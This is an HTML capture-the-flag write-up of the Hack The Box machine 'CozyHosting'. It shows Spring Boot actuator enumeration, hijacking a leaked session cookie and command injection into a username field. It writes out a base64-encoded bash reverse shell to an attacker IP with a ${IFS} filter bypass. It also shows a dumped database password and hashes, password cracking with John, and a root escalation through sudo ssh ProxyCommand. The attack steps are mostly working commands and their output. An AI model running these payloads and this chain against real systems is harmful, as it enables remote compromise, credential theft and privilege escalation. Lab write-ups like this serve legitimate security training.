+    X-XSS-Protection[0], nginx[1.18.0]</code></pre><h2 id="e0295e0c-ea1d-4719-a7fc-feb468e0b6b7" class="">FINDINGS</h2><ul id="8952b3f1-5a8f-4ff8-afa5-93ab8f3eb692" class="bulleted-list"><li style="list-style-type:disc">BootstrapMade  - Bootstrap v5.2.3</li></ul><ul id="6d58cc97-fdb9-49fa-8aca-2956511c4823" class="bulleted-list"><li style="list-style-type:disc">Login</li></ul><ul id="f5da83e5-5790-441a-a2f6-1f889e8cfee8" class="bulleted-list"><li style="list-style-type:disc">nginx[1.18.0]</li></ul><ul id="01959dc5-a838-4fd8-9b08-1dfc3528d77b" class="bulleted-list"><li style="list-style-type:disc">JSESSIONID - JAVA</li></ul><h1 id="aab16a9e-8c5a-4147-88d2-8e2873805dfb" class="">User</h1><p id="c5176a3f-e952-49ac-bcf0-2575715c9bfb" class="">We start with JAVA - Springboot enumeration</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a49b610-54e5-4e51-b346-aa98a20cfeb4" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb/FUZZ -t 50 --sc 200
+     /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+    ********************************************************
+    * Wfuzz 3.1.0 - The Web Fuzzer                         *
+    ********************************************************
+    
+    Target: http://cozyhosting.htb/FUZZ
+    Total requests: 112
+    
+    =====================================================================
+    ID           Response   Lines    Word       Chars       Payload                                             
+    =====================================================================
+    
+    000000072:   200        0 L      1 W        95 Ch       &quot;actuator/sessions&quot;                                 
+    000000029:   200        0 L      1 W        634 Ch      &quot;actuator&quot;                                          
+    000000044:   200        0 L      13 W       487 Ch      &quot;actuator/env/path&quot;                                 
+    000000041:   200        0 L      13 W       487 Ch      &quot;actuator/env/lang&quot;                                 
+    000000039:   200        0 L      13 W       487 Ch      &quot;actuator/env/home&quot;                                 
+    000000038:   200        0 L      120 W      4957 Ch     &quot;actuator/env&quot;                                      
+    000000051:   200        0 L      1 W        15 Ch       &quot;actuator/health&quot;                                   
+    000000058:   200        0 L      108 W      9938 Ch     &quot;actuator/mappings&quot;                                 
+    000000032:   200        0 L      542 W      127224 Ch   &quot;actuator/beans&quot;                                    
+    
+    Total time: 0.837777
+    Processed Requests: 112
+    Filtered Requests: 103
+    Requests/sec.: 133.6870</code></pre><p id="988a9191-8498-4f5f-aedf-d4f9cec9b1fd" class=""><a href="https://www.baeldung.com/spring-boot-actuators">https://www.baeldung.com/spring-boot-actuators</a></p><figure id="b1231daf-076a-42d9-8ad8-7c784399e8bf" class="image"><a href="../img/CozyHosting/Untitled 7.png"><img style="width:1908px" src="../img/CozyHosting/Untitled 7.png"/></a></figure><p id="3e9eb504-5bc8-4bd5-957b-02217c711ee7" class="">On “<a href="http://cozyhosting.htb/actuator/sessions">http://cozyhosting.htb/actuator/sessions</a>” </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e28c26c7-f38f-4d20-8bb8-cc75bd8c1d1b" class="code"><code class="language-JavaScript">{&quot;32759DAFE2ED9C19E96C99116BBC9195&quot;:&quot;kanderson&quot;,&quot;7B05F07F939CF49532D06BABB31CB0A8&quot;:&quot;kanderson&quot;}</code></pre><p id="f0cd3a85-1fdf-4e00-9c96-f04eaa68a7ab" class="">
+    </p><p id="44fe72ee-d159-454f-b8f6-10c395fc88e5" class="">Just change the JSESSIONID  for once of “<a href="http://cozyhosting.htb/actuator/sessions">http://cozyhosting.htb/actuator/sessions</a>”</p><figure id="d265c959-d527-4c21-b733-962afbe3fd24" class="image"><a href="../img/CozyHosting/Untitled 8.png"><img style="width:1917px" src="../img/CozyHosting/Untitled 8.png"/></a></figure><p id="aef51415-d7e1-45dd-b2ad-a98576d8a425" class="">
+    </p><p id="32ebf6fa-51fd-4b28-909f-c18515ffee97" class="">And go to /login and we are in</p><figure id="96750a16-33d9-4cb2-9c1d-57a0a3e35791" class="image"><a href="../img/CozyHosting/Untitled 9.png"><img style="width:1920px" src="../img/CozyHosting/Untitled 9.png"/></a></figure><p id="de8e815a-5012-403c-b7c3-bdf47f2e90fa" class="">
+    </p><p id="6106e1b0-64c2-4906-b520-34a4c873cf39" class="">We can intercept the conection of </p><figure id="63d00117-21c5-4431-8385-1c45d006a486" class="image"><a href="../img/CozyHosting/Untitled 10.png"><img style="width:1920px" src="../img/CozyHosting/Untitled 10.png"/></a></figure><p id="fd20283b-b20d-4f3d-88f4-9d72cb0d7af3" class="">Change and modify username and we have an error, that error means that we can inject command os</p><figure id="cf342ddb-360c-42b5-becf-ed8bdd36241c" class="image"><a href="../img/CozyHosting/Untitled 11.png"><img style="width:1920px" src="../img/CozyHosting/Untitled 11.png"/></a></figure><p id="7990338d-1c4c-401b-8f67-e1ae49be5c5e" class="">So try with command injection </p><figure id="f2dd273b-1a40-4045-992a-a7f0bf3aefd2" class="image"><a href="../img/CozyHosting/Untitled 12.png"><img style="width:1920px" src="../img/CozyHosting/Untitled 12.png"/></a></figure><p id="ebe1f53b-ea56-48fb-9ee5-9944f5459f8b" class="">This error can be bypassed with ${IFS} → <a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions">https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions</a></p><figure id="ed279607-2650-4868-a2ad-9e6d4ef6b9be" class="image"><a href="../img/CozyHosting/Untitled 13.png"><img style="width:1610px" src="../img/CozyHosting/Untitled 13.png"/></a></figure><p id="f08725b2-e733-4a4b-96a6-c88d588a9581" class="">So, we create reverseshell</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="77fe76ef-a7b7-4396-9555-481234ec1189" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.11/1205 0&gt;&amp;1&quot; | base64 -w 0
+    YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMjA1IDA+JjEK</code></pre><p id="4f4f3002-e7bd-47be-bfaa-848f7c720f7f" class="">
+    </p><p id="138b461e-aac0-480e-bcbd-d3f713d5c434" class="">The payload will be </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3fe79b84-9e42-40f3-b603-d475d74df7f3" class="code"><code class="language-JavaScript">;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMjA1IDA+JjEK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;</code></pre><p id="788f25ba-d194-47ac-b001-f1f1881aa870" class="">When we tried we received an error, let’s try with url encoding with burpsuite</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="52da9460-0f54-4a5c-872c-604274d39bea" class="code"><code class="language-JavaScript">%3becho${IFS}YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMjA1IDA%2bJjEK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash%3b</code></pre><p id="784a38d4-32d5-4351-8e69-3b5d43bd8328" class="">Before execute, open listener with netcat</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fee40850-d9f6-4651-8b8d-695333cfa6d7" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ nc -lnvp 1205</code></pre><p id="0b53053f-def4-47fb-92b9-3129e271b9e5" class="">
+    </p><p id="64dad515-92eb-4453-9f42-fa10280f582f" class="">We have shell</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ce5902c9-3b3b-4727-8cd9-c49a8e75ea22" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.page/drroot.github.io]
+    └─$ nc -lnvp 1205
+    listening on [any] 1205 ...
+    connect to [10.10.14.11] from (UNKNOWN) [10.10.11.230] 52032
+    bash: cannot set terminal process group (1066): Inappropriate ioctl for device
+    bash: no job control in this shell
+    app@cozyhosting:/app$ whoami
+    whoami
+    app</code></pre><p id="c94cf957-d1ec-4f06-b1c4-c7849ac8aff3" class="">Open webserver to download jar file</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="de682a0e-f35d-476c-8546-61da1eda5579" class="code"><code class="language-JavaScript">app@cozyhosting:/app$ ls
+    ls
+    cloudhosting-0.0.1.jar
+    app@cozyhosting:/app$ python3 -m http.server 8081
+    python3 -m http.server 8081
+    Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...</code></pre><figure id="75c2506c-8864-4b78-b23e-a9e6e276816b" class="image"><a href="../img/CozyHosting/Untitled 14.png"><img style="width:1916px" src="../img/CozyHosting/Untitled 14.png"/></a></figure><p id="90bd2056-1434-4cef-b75e-f028adc4d97d" class="">Download and load it on Jadx, search for “Password” in &quot;htb.cloudhosting.scheduled” you’ll find one password. On the other hand we have a potential command injection with “Runtime.getRuntime().exec()” function</p><figure id="086927dc-ef6f-4ae8-8087-324048e7518a" class="image"><a href="../img/CozyHosting/Untitled 15.png"><img style="width:1920px" src="../img/CozyHosting/Untitled 15.png"/></a></figure><p id="2b26c916-e010-4859-b464-47d23772c75a" class="">Config Files</p><figure id="56fa7fce-880a-4400-94dc-d4f67e3f0c26" class="image"><a href="../img/CozyHosting/Untitled 16.png"><img style="width:1919px" src="../img/CozyHosting/Untitled 16.png"/></a></figure><p id="7b1c2e57-fcdc-4bd3-97c7-ae4ccd0283da" class="">Try to login on postgres <a href="https://alvinalexander.com/blog/post/postgresql/log-in-postgresql-database/">https://alvinalexander.com/blog/post/postgresql/log-in-postgresql-database/</a></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="857e9031-cc14-485e-a06a-230af14cab9f" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~]
+    └─$ nc -lnvp 1205
+    listening on [any] 1205 ...
+    connect to [10.10.14.8] from (UNKNOWN) [10.10.11.230] 51476
+    bash: cannot set terminal process group (1063): Inappropriate ioctl for device
+    bash: no job control in this shell
+    app@cozyhosting:/app$ ls
+    ls
+    cloudhosting-0.0.1.jar
+    app@cozyhosting:/app$ psql -d 127.0.0.1 -U postgres
+    psql -d 127.0.0.1 -U postgres
+    psql: error: connection to server on socket &quot;/var/run/postgresql/.s.PGSQL.5432&quot; failed: FATAL:  Peer authentication failed for user &quot;postgres&quot;
+    app@cozyhosting:/app$ sudo -l
+    sudo -l
+    sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+    sudo: a password is required
+    app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
+    psql -h 127.0.0.1 -U postgres
+    Password for user postgres: Vg&amp;nvzAQ7XxR
+    
+    help
+    
+    
+    
+    \c cozyhosting
+    You are now connected to database &quot;cozyhosting&quot; as user &quot;postgres&quot;.
+    \d
+                  List of relations
+     Schema |     Name     |   Type   |  Owner   
+    --------+--------------+----------+----------
+     public | hosts        | table    | postgres
+     public | hosts_id_seq | sequence | postgres
+     public | users        | table    | postgres
+    (3 rows)
+    
+    select * from users;
+       name    |                           password                           | role  
+    -----------+--------------------------------------------------------------+-------
+     kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+     admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+    </code></pre><p id="97308c3e-d049-4306-af05-3fe23addcff4" class="">Put the password hash on txt file and use John</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e5d5eed3-3d10-403a-b6d7-3eaf7e6cb08b" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Descargas]
+    └─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt    
+    Created directory: /home/drroot/.john
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+    Cost 1 (iteration count) is 1024 for all loaded hashes
+    Will run 16 OpenMP threads
+    Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+     (?)     
+    1g 0:00:00:04 DONE (2024-02-22 02:50) 0.2132g/s 614.0p/s 614.0c/s 614.0C/s onlyme..soccer9
+    Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+    Session completed. 
+    </code></pre><p id="a6745bbb-687a-4161-961e-abd013ceede3" class="">
+    </p><p id="4e8ec066-1536-479d-a0b0-2ead8b24dc8d" class="">Inspect “/home” and u’ll find “josh” user, then try with ssh and the password cracked</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8190aae1-25b7-4ea2-b3c3-453515a6fe3f" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~]
+    └─$ ssh josh@10.10.11.230 
+    josh@10.10.11.230&#x27;s password: 
+    Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
+    
+     * Documentation:  https://help.ubuntu.com
+     * Management:     https://landscape.canonical.com
+     * Support:        https://ubuntu.com/advantage
+    
+      System information as of Thu Feb 22 07:51:57 AM UTC 2024
+    
+      System load:           0.080078125
+      Usage of /:            53.4% of 5.42GB
+      Memory usage:          13%
+      Swap usage:            0%
+      Processes:             235
+      Users logged in:       0
+      IPv4 address for eth0: 10.10.11.230
+      IPv6 address for eth0: dead:beef::250:56ff:feb9:43de
+    
+    
+    Expanded Security Maintenance for Applications is not enabled.
+    
+    0 updates can be applied immediately.
+    
+    Enable ESM Apps to receive additional future security updates.
+    See https://ubuntu.com/esm or run: sudo pro status
+    
+    
+    The list of available updates is more than a week old.
+    To check for new updates run: sudo apt update
+    
+    Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
+    josh@cozyhosting:~$ cat user.txt 
+    270cc3a50ff311ec80aef07620f1c225
+    </code></pre><p id="23d39885-6470-4a43-a17c-aaa98f5b93ae" class="">
+    </p><h1 id="8998174b-dc1e-4280-9c9d-2e0032d753fa" class="">Root</h1><p id="f0742e00-a473-433d-85ec-9718757a2fef" class="">Now, execute “sudo -l”</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="58d62b80-cbc2-4bbe-8381-95632dd70145" class="code"><code class="language-JavaScript">josh@cozyhosting:~$ sudo -l
+    [sudo] password for josh: 
+    Matching Defaults entries for josh on localhost:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+    
+    User josh may run the following commands on localhost:
+        (root) /usr/bin/ssh *
+    </code></pre><p id="d92e89ca-bf32-4cb0-8938-492161f470f9" class="">Search on GTOBins <a href="https://gtfobins.github.io/gtfobins/ssh/">https://gtfobins.github.io/gtfobins/ssh/</a></p><figure id="cf1994e4-7a0d-4aa8-83fe-d4392ce931fc" class="image"><a href="../img/CozyHosting/Untitled 17.png"><img style="width:858px" src="../img/CozyHosting/Untitled 17.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5cf8f701-d024-43c6-9f7f-30b950da89f7" class="code"><code class="language-JavaScript">josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x
+    # whoami
+    root
+    # cat /root/root.txt
+    53cd54761a997181ecca2bd2657e44a0
+    </code></pre><p id="d3c86d94-a99b-482f-9ff6-6c1c3196db8e" class="">
+    </p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
